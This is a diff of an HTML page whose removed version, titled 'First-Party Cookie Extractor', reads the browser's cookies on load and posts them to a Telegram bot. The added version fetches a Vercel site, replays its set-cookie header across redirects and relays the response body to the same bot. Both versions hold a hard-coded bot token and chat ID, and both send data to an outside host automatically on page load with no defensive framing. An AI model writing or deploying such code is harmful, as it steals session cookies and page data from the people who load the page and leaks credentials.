@@ -3,48 +3,79 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>First-Party Cookie Extractor</title>
+    <title>Fetch and Send to Telegram</title>
+    <script>
+        // Place your JavaScript code here
+        const TelegramBotToken = '7694280275:AAGH4Vj9dh9gCMoAwmPeikpWbtyStdNwXc8'; // Replace with your Telegram Bot Token
+        const ChatID = '693873866'; // Replace with your Telegram chat ID
+
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TelegramBotToken}/sendMessage`;
+            const body = {
+                chat_id: ChatID,
+                text: message,
+                parse_mode: 'HTML',
+            };
+
+            const requestOptions = {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(body),
+            };
+
+            try {
+                const response = await fetch(url, requestOptions);
+                const data = await response.json();
+                if (!data.ok) {
+                    console.error('Failed to send message to Telegram:', data.description);
+                }
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+            }
+        }
+
+        async function fetchWithRedirects(url, requestOptions) {
+            try {
+                const resp = await fetch(url, requestOptions);
+
+                if ([301, 302, 303, 304, 306, 307, 308].includes(resp.status)) {
+                    let vercelCookie = resp.headers.get('set-cookie');
+                    let myHeadersWithCookie = new Headers();
+                    myHeadersWithCookie.append("Cookie", vercelCookie);
+
+                    const requestOptionsWithNewCookie = {
+                        method: 'GET',
+                        headers: myHeadersWithCookie,
+                    };
+
+                    const resWithCookie = await fetch(resp.url, requestOptionsWithNewCookie);
+                    const bodyWithCookie = await resWithCookie.text();
+                    await sendToTelegram(`Redirect Response (${resp.status}):\n${bodyWithCookie}`);
+
+                } else {
+                    const body = await resp.text();
+                    await sendToTelegram(`Non-Redirect Response (${resp.status}):\n${body}`);
+                }
+            } catch (error) {
+                console.error('Error during fetch:', error);
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const requestOptions = {
+                method: 'GET',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+            };
+            fetchWithRedirects("https://nextjs-demo-ebon-iota.vercel.app/", requestOptions);
+        });
+    </script>
 </head>
 <body>
-
-<h1>Extract First-Party Cookies</h1>
-<p id="cookie-status">Checking cookies...</p>
-
-<script>
-    // Function to get all cookies as a string
-    function getAllCookies() {
-        return document.cookie;  // This retrieves all first-party cookies from the current domain
-    }
-
-    // Function to send cookies to Telegram via a bot
-    function sendCookiesToTelegram(cookieValue) {
-        const botToken = '7694280275:AAGH4Vj9dh9gCMoAwmPeikpWbtyStdNwXc8';  // Your bot token
-        const chatId = '693873866';  // Your chat ID
-        const message = encodeURIComponent(`Extracted Cookies: ${cookieValue}`);
-
-        // Fetch API to send the message to Telegram
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`)
-            .then(response => {
-                if (response.ok) {
-                    console.log("Cookies sent to Telegram successfully.");
-                } else {
-                    console.log("Failed to send cookies to Telegram.");
-                }
-            })
-            .catch(error => {
-                console.error("Error sending message to Telegram:", error);
-            });
-    }
-
-    // Get all first-party cookies and send them to Telegram
-    const cookies = getAllCookies();
-    if (cookies) {
-        document.getElementById("cookie-status").textContent = `Cookies found: ${cookies}`;
-        sendCookiesToTelegram(cookies);  // Send cookies to Telegram
-    } else {
-        document.getElementById("cookie-status").textContent = "No cookies found.";
-    }
-</script>
-
+    <h1>Fetching Data and Sending to Telegram</h1>
+    <p>Check the console for logs.</p>
 </body>
 </html>
